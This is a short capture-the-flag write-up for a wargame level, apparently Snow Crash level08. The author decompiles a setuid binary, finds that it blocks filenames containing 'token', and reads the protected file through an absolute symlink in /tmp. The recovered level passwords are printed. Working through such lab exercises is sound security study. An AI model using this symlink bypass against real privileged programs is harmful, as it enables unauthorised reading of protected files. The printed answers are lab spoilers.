# level08

Target is `flag08`. Let's scout a bit:

```sh
ls -lA
```

Files:

```
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

Looks like the token is just out of reach: we can see the file but we lack the permission to read it. `level08` has setuid/setgid bits set so that's probably our starting point.

```sh
file level08
```

Without much surprise:

```
level08: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xbe40aba63b7faec62e9414be1b639f394098532f, not stripped
```

With Ghidra:

```c
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int __fd;
  size_t __n;
  ssize_t sVar2;
  int in_GS_OFFSET;
  undefined4 *in_stack_00000008;
  int fd;
  int rc;
  char buf [1024];
  undefined1 local_414 [1024];
  int local_14;

  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc == 1) {
    printf("%s [file to read]\n",*in_stack_00000008);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar1 = strstr((char *)in_stack_00000008[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",in_stack_00000008[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __fd = open((char *)in_stack_00000008[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",in_stack_00000008[1]);
  }
  __n = read(__fd,local_414,0x400);
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }
  sVar2 = write(1,local_414,__n);
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return sVar2;
}
```

Still ugly, but we can see what is going on. Let's try a naive approach first:

```sh
./level08 token
```

Output:

```
You may not access 'token'
```

That would have been too easy. Creating a symbolic link should do the trick though.

```sh
ln -vfs token /tmp/bbrassar && ./level08 /tmp/bbrassar
```

Output:

```
level08: Unable to open /tmp/bbrassar: No such file or directory
```

Shoot. There are some weird behaviors with symbolic link pointing to relative files. Let's try to force it to be absolute:

```sh
ln -vfs "$(realpath token)" /tmp/bbrassar && ./level08 /tmp/bbrassar
```

Output:

```
quif5eloekouj29ke0vouxean
```

Let's try this as password

```
level09@localhost's password: quif5eloekouj29ke0vouxean
Permission denied, please try again.
```

Ah. Let's try this as password for `flag08` then:

```
flag08@localhost's password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
```

Nice try. Real token is `25749xKZ8L7DkSCwJkT9dyv6f`

Let's try THAT as password for the next level:

```
level09@localhost's password: 25749xKZ8L7DkSCwJkT9dyv6f
```

It worked :)
